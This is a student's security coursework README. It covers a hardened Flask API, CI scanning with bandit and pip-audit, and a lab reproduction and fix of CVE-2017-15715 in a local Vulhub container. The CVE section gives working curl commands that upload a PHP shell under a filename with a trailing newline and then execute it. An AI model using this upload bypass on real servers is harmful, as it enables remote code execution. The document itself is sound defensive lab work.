# Work 1: Secure REST API Development with CI/CD and Real CVE Vulnerability Analysis

**Student Name:** Yu Zhenlei (俞振磊)
**Student ID (HDU number):** 23320217
**Class:** 23320112

**Repository:** https://github.com/Yewleaves/secure-api-lab
**Last successful pipeline run:** https://github.com/Yewleaves/secure-api-lab/actions/workflows/ci.yml

## 1. Project & API Description
This project is a secure REST API built with Python and the Flask framework, using SQLite for data storage. It implements the following three endpoints:
1. `POST /auth/login` - User authentication (accepts username and password), returns a JWT token upon success.
2. `GET /api/data` - Retrieves data (restricted to authenticated users with a valid Bearer token).
3. `POST /api/posts` - Custom endpoint for creating a new post (protected by JWT).

**How to call the API:**
- Login: `curl -X POST http://127.0.0.1:5000/auth/login -H "Content-Type: application/json" -d '{"username":"alice","password":"password123"}'`
- Get data: `curl http://127.0.0.1:5000/api/data -H "Authorization: Bearer <your_token>"`

## 2. Security Measures Implementation
- **SQL Injection (SQLi) Protection**: All database interactions (e.g., `db.execute`) use parameterized queries (`?` placeholders). String concatenation is strictly avoided.
- **Cross-Site Scripting (XSS) Protection**: When returning user-submitted data (in `POST /api/posts`), the `markupsafe.escape()` function is used to HTML-escape the input, ensuring `<script>` tags are converted to `&lt;script&gt;`.
- **Authentication & Password Hashing**:
  - Passwords are never stored in plaintext. They are hashed and salted using the `bcrypt` algorithm before being stored in the database.
  - Upon successful login, a JWT (HS256 algorithm) valid for 1 hour is issued.
  - A custom `@token_required` middleware intercepts and rejects any requests without a valid token.

### API Testing Screenshots
<img width="835" height="399" alt="6flask响应日志" src="https://github.com/user-attachments/assets/340ca746-067f-4460-b15a-4f416ff8bdd0" />
<img width="1071" height="1025" alt="5测试" src="https://github.com/user-attachments/assets/0155ec50-707c-4faa-b74e-9593f226b8fc" />



## 3. CI/CD Security Scanning
A GitHub Actions pipeline (`.github/workflows/ci.yml`) is configured. On every code push, it automatically runs:
- **SAST (Static Application Security Testing)**: Uses `bandit` to scan the source code for security flaws.
- **SCA (Software Composition Analysis)**: Uses `pip-audit` to check for known CVE vulnerabilities in dependencies.

`bandit` runs with `-ll -iii`, i.e. it reports only medium-or-higher severity findings that it is highly confident about.
`pip-audit` is the Python-native SCA scanner: it resolves `requirements.txt` and checks every pinned package against the PyPI/OSV advisory database, and it is invoked with `--strict` so that any known vulnerable dependency fails the build.

### GitHub Actions Screenshot
<img width="1581" height="1518" alt="7github2" src="https://github.com/user-attachments/assets/65ba306e-3d11-4e72-8ebc-08b4c00dafc5" />



---

## 4. CVE Vulnerability Analysis (CVE-2017-15715)
**Vulnerability:** Apache HTTP Server File Upload Bypass (Newline Parsing)
**Affected Versions:** Apache 2.4.0 to 2.4.29
**Description:** This vulnerability allows attackers to bypass file upload restrictions. By appending a newline character (`\x0A`) to a filename (e.g., `shell.php\n`), the uploader's blacklist check is bypassed, but Apache still parses and executes the file as a PHP script, leading to Remote Code Execution (RCE).

### Steps to Reproduce
The vulnerable environment is the official Vulhub one (`vulhub/httpd/CVE-2017-15715`), which runs a PHP 5.5 + Apache 2.4.x stack inside the affected version range, in front of a small file-upload page.

```bash
git clone https://github.com/vulhub/vulhub.git
cd vulhub/httpd/CVE-2017-15715
docker compose up -d          # Apache is published on http://127.0.0.1:8080
```

First confirm that the blacklist blocks a normal PHP upload:

```bash
printf '<?php echo "pwned"; ?>' > shell.php
curl -i -F "file=@shell.php" -F "name=1.php" http://127.0.0.1:8080/
# -> HTTP 200, body: bad file
```

Now append a single `\x0A` to the filename (`$'...'` lets bash expand `\x0a`). The extension extracted by `pathinfo()` becomes `php\n`, which is not in the blacklist, so the file is written to disk:

```bash
curl -i -F "file=@shell.php" -F $'name=1.php\x0a' http://127.0.0.1:8080/
# -> HTTP 200, the file is accepted
curl -i "http://127.0.0.1:8080/1.php%0a"
# -> HTTP 200 + "pwned": Apache executed the uploaded script
```

<img width="969" height="291" alt="1漏洞复现2" src="https://github.com/user-attachments/assets/61556fd2-8cff-480a-b4a3-b8c3b25ec2d8" />


### Root Cause Analysis
The vulnerability lies in how PHP's `pathinfo()` function and Apache's `<FilesMatch \.php$>` directive handle newline characters. When a filename like `shell.php\n` is uploaded, `pathinfo()` extracts the extension as `php\n`, which bypasses the blacklist (which only checks for `php`). However, Apache's regex `$` anchor matches the newline character, causing Apache to execute the file as PHP. This is a classic case of **improper input validation**.

### Fix and Verification
- **Fix Applied**: I modified the `index.php` source code to explicitly block filenames containing newline characters using a regular expression: `if (preg_match('/[\r\n]/', $name)) { exit('bad file'); }`. (The fixed `index.php` and `docker-compose.yml` files are located in the `cve-fix/` directory.)
- **Environment**: `cve-fix/Dockerfile` deliberately reuses the same vulnerable base image (`vulhub/php:5.5-apache`, PHP 5.5 + Apache 2.4.x in the vulnerable range) and only replaces `index.php`. Keeping the image identical isolates the code change, so the result cannot be explained by an Apache upgrade.

```bash
cd cve-fix
docker compose up --build -d
```

- **Verification**: After applying the fix and restarting the environment, the exact same exploit payload was sent again. The server rejected the upload, returned `bad file` with HTTP 200, and the file was never written to disk — therefore requesting it yields `404 Not Found`. Normal uploads still work:

```bash
# exploit payload again
curl -i -F "file=@shell.php" -F $'name=1.php\x0a' http://127.0.0.1:8080/
# -> HTTP 200, body: bad file
curl -i "http://127.0.0.1:8080/1.php%0a"
# -> HTTP 404, the script does not exist

# regression test: a legitimate upload still succeeds
curl -i -F "file=@shell.php" -F "name=note.txt" http://127.0.0.1:8080/
curl -i "http://127.0.0.1:8080/note.txt"
# -> HTTP 200, content is served normally
```

This proves the vulnerability is remediated while normal functionality remains intact.

<img width="1079" height="351" alt="2 修复成功2" src="https://github.com/user-attachments/assets/70321143-7629-4805-9293-5ea1075c3412" />
